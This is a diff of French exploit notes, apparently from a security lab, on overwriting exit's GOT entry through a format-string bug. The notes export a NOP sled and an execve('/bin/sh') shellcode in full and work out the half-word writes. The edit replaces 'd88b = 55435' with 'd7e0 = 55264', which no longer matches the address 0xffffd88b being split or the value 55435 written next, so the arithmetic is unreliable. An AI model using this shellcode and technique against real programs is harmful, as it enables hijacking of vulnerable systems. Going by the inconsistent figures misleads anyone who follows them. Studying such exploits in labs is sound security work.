@@ -3,7 +3,7 @@ Idee generale : remplacer l'adresse d'exit par l'adresse d'un shellcode mis dans
 export SHELLCODE=$(python -c 'print "\x90"*100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
 
 
-- adresse de SHELLCODE = 0xffffd84d
+- adresse de SHELLCODE = 0xffffd84e
 - adresse d'un des NOP = 0xffffd88b
 
 1) on trouve l'adresse GOT d'exit grace a objdump -R
@@ -18,7 +18,7 @@ export SHELLCODE=$(python -c 'print "\x90"*100 + "\xeb\x1f\x5e\x89\x76\x08\x31\x
     => offset = 10
 
 2) on coupe en deux 0xffffd88b
-    d88b = 55435
+    d7e0 = 55264
     ffff = 65535
 
     on va ecrire 55435 a l'offset 10
